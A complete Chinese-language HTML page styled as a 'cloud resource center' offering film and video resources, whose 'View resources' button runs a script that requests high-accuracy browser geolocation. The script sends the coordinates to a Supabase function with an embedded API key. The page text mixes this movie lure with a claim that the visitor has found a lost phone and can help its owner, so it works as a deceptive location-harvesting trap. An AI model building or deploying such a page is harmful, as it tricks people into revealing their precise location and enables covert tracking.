
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#f4f7fc">
  <title>云端资源中心</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 28px 16px;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont,
        "Segoe UI", sans-serif;
      color: #202b3c;
      background:
        radial-gradient(circle at 10% 5%, #dceaff 0, transparent 35%),
        linear-gradient(145deg, #f4f7fc, #edf3fb);
    }

    .container {
      max-width: 460px;
      margin: 28px auto;
    }

    .top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 34px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 17px;
      font-weight: 700;
    }

    .cloud-icon {
      width: 40px;
      height: 40px;
      display: grid;
      place-items: center;
      background: #e0edff;
      border-radius: 13px;
      font-size: 23px;
    }

    .online {
      color: #16865a;
      background: #e3f7ed;
      padding: 6px 11px;
      border-radius: 20px;
      font-size: 12px;
    }

    .heading {
      margin-bottom: 24px;
    }

    .heading h1 {
      font-size: 27px;
      line-height: 1.4;
      margin: 0 0 8px;
      letter-spacing: -.5px;
    }

    .heading p {
      margin: 0;
      color: #7b8799;
      font-size: 14px;
      line-height: 1.7;
    }

    .card {
      background: rgba(255,255,255,.95);
      border: 1px solid #e9eef6;
      border-radius: 22px;
      padding: 22px;
      box-shadow: 0 12px 35px rgba(39,75,125,.08);
    }

    .file-icon {
      width: 62px;
      height: 62px;
      border-radius: 17px;
      background: #e8f1ff;
      display: grid;
      place-items: center;
      font-size: 32px;
      margin-bottom: 18px;
    }

    .file-title {
      font-size: 19px;
      font-weight: 700;
      margin-bottom: 7px;
    }

    .file-subtitle {
      color: #8b96a7;
      font-size: 13px;
      margin-bottom: 20px;
    }

    .line {
      height: 1px;
      background: #edf0f5;
      margin: 18px 0;
    }

    .description {
      color: #626f82;
      font-size: 14px;
      line-height: 1.8;
    }

    .notice {
      background: #f1f6ff;
      color: #42628e;
      border-radius: 12px;
      padding: 13px;
      font-size: 13px;
      line-height: 1.7;
      margin-top: 16px;
    }

    button {
      width: 100%;
      border: none;
      border-radius: 13px;
      padding: 16px;
      margin-top: 20px;
      color: white;
      font-size: 16px;
      font-weight: 600;
      background: linear-gradient(110deg, #3988f5, #2869dc);
      box-shadow: 0 7px 17px rgba(45,117,224,.22);
      cursor: pointer;
      transition: .2s;
    }

    button:active {
      transform: scale(.98);
    }

    button:disabled {
      opacity: .55;
      cursor: not-allowed;
    }

    #result {
      display: none;
      margin-top: 18px;
      padding: 15px;
      border-radius: 12px;
      background: #f4f7fb;
      color: #46566d;
      font-size: 13px;
      line-height: 1.8;
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }

    .footer {
      text-align: center;
      color: #9aa5b5;
      font-size: 12px;
      line-height: 1.8;
      margin-top: 22px;
    }
  </style>
</head>

<body>
  <div class="container">

    <div class="top">
      <div class="brand">
        <div class="cloud-icon">☁️</div>
        云端资源中心
      </div>
      <div class="online">● 在线服务</div>
    </div>

    <div class="heading">
      <h1>欢迎访问云端资源中心</h1>
      <p>资源信息与在线服务入口</p>
    </div>

    <div class="card">

      <div class="file-icon">📦</div>

      <div class="file-title">云服务影视资源</div>

      <div class="file-subtitle">
        在线服务 · 位置分享功能
      </div>

      <div class="line"></div>

      <div class="description">
        如果你捡到了这部手机，并愿意帮助失主找回，
        可以自愿分享当前位置。
      </div>

      <div class="notice">
        <strong>位置分享说明</strong><br>
        点击下方按钮后，浏览器会请求定位权限。
        只有你主动允许后，当前位置才会上传，
        影视资源大全。
      </div>

      <button id="shareButton" onclick="getLocation()">
        查看资源
      </button>

      <div id="result" aria-live="polite"></div>

    </div>

    <div class="footer">
      云端在线服务<br>
      位置仅在主动授权后获取和上传
    </div>

  </div>

  <script>
    const FUNCTION_URL =
      "https://xsccvztarcmwekuhnwvo.supabase.co/functions/v1/rapid-action";

    const SUPABASE_KEY =
      "sb_publishable_5Eo-7HNm1xWLyblogIYgfw_WtzhXHJs";

    async function getLocation() {
      const result = document.getElementById("result");
      const button = document.getElementById("shareButton");

      result.style.display = "block";

      if (!window.isSecureContext) {
        result.textContent =
          "当前网页不是安全连接，请使用 HTTPS 地址打开。";
        return;
      }

      if (!navigator.geolocation) {
        result.textContent =
          "当前浏览器不支持定位功能。";
        return;
      }

      button.disabled = true;
      result.textContent =
        "正在请求定位，请在浏览器弹窗中选择是否允许……";

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          result.textContent =
            "定位获取成功！\n" +
            "正在上传位置，请稍候……";

          try {
            const response = await fetch(FUNCTION_URL, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "apikey": SUPABASE_KEY
              },
              body: JSON.stringify({
                action: "report",
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                consent: true
              })
            });

            const rawText = await response.text();
            let data;

            try {
              data = JSON.parse(rawText);
            } catch {
              throw new Error(
                "服务器返回异常：" + rawText.slice(0, 300)
              );
            }

            if (!response.ok || !data.success) {
              throw new Error(
                "HTTP状态：" + response.status +
                "\n错误：" + (data.error || "未知错误") +
                "\n详情：" + (data.details || "无") +
                "\n错误代码：" + (data.code || "无")
              );
            }

            result.textContent =
              "✓ 成功！\n\n" +
              "感谢你愿意帮助失主。\n" +
              "定位精度：" + Math.round(accuracy) + " 米\n" +
              "分享时间：" +
              new Date().toLocaleString("zh-CN");

          } catch (error) {
            result.textContent =
              "位置获取成功，但上传失败。\n\n" +
              "错误信息：\n" + error.message;
          } finally {
            button.disabled = false;
          }
        },

        function(error) {
          const messages = {
            1: "你拒绝了定位权限。如愿意分享，请在浏览器设置中允许定位。",
            2: "设备暂时无法确定位置，请稍后重试。",
            3: "定位超时，请检查网络或重新尝试。"
          };

          result.textContent =
            "定位未成功。\n" +
            (messages[error.code] || error.message);

          button.disabled = false;
        },

        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
